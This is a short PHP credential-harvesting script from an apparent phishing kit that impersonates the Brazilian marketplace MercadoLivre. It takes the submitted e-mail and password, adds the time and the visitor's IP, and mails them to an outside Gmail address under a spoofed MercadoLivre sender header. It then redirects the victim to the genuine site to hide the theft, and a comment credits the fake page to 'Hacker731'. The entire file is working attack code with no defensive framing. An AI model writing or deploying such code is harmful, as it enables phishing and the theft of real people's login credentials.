<?php
$user = $_POST['samuel0066'];
$pw   = $_POST['121212'];
$hora=@date("H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From : contato@mercadolivre.com";
$conteudo.="<b>=========================================================</b><br>";
$conteudo.="<b>$browser $browser_version<br>";
$conteudo.="<b>E-mail: </b> $user<br></br>";
$conteudo.="<b>Senha: </b> $pw<br></br>";
$conteudo.="<b>IP: </b> $ip<br></br>";
$conteudo.="<b>------------------------------------------</b><br>";
@mail("mercadopac4@gmail.com", "$user $hora", "$conteudo", $headers);
?>
<?php

   header( 'Location: http://www.mercadolivre.com.br/' ) ; // Página Fake feita por Hacker731.

?>
